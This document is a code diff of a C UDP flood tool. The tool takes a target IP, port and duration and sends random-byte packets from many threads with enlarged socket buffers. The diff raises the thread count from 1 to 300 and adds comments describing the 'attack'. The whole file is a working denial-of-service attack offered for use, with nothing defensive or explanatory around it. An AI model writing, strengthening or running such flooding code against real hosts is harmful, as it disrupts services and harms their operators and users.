@@ -10,24 +10,26 @@
 #include <time.h>
 #include <sys/time.h>
 
-#define MAX_THREADS 1
-#define BUFFER_SIZE 100
-#define BATCH_SEND 9 // Number of packets to send per batch
+#define MAX_THREADS 300  // Increased to 300 threads
+#define BUFFER_SIZE 100  // Size of each UDP packet
+#define BATCH_SEND 9     // Number of packets to send per batch
 
+// Structure to pass data to each thread
 typedef struct {
-    char *ip;
-    int port;
-    int duration;
-    int thread_id;
+    char *ip;           // Target IP address
+    int port;           // Target port
+    int duration;       // Attack duration in seconds
+    int thread_id;      // Unique ID for each thread
 } thread_data_t;
 
+// Function to fill a buffer with random data
 void create_game_packet(char *buffer, int buffer_size) {
-    // Fill packet with random data once
     for (int i = 0; i < buffer_size; i++) {
-        buffer[i] = (char)(rand() % 256);
+        buffer[i] = (char)(rand() % 256);  // Fill with random bytes
     }
 }
 
+// Function executed by each thread to send UDP packets
 void *udp_flood(void *arg) {
     thread_data_t *data = (thread_data_t *)arg;
     int sockfd;
@@ -45,7 +47,7 @@ void *udp_flood(void *arg) {
     }
 
     // Optimize socket buffer size for sending large quantities of packets
-    int optval = 1 << 20; // 1 MB buffer
+    int optval = 1 << 20;  // 1 MB buffer
     setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &optval, sizeof(optval));
 
     // Set up target address information
@@ -76,20 +78,22 @@ void *udp_flood(void *arg) {
         }
     }
 
+    // Close the socket and exit the thread
     close(sockfd);
     pthread_exit(NULL);
 }
 
 int main(int argc, char *argv[]) {
-    if (argc != 4) { // We expect only 3 arguments: IP, port, duration
+    if (argc != 4) {  // We expect only 3 arguments: IP, port, duration
         printf("Usage: %s <target IP> <port> <time duration>\n", argv[0]);
         exit(1);
     }
 
+    // Parse command-line arguments
     char *ip = argv[1];
     int port = atoi(argv[2]);
     int duration = atoi(argv[3]);
-    int num_threads = MAX_THREADS; // Automatically set to 200 threads
+    int num_threads = MAX_THREADS;  // Use 300 threads by default
 
     printf("Starting UDP flood to %s:%d with %d threads for %d seconds.\n", ip, port, num_threads, duration);
 
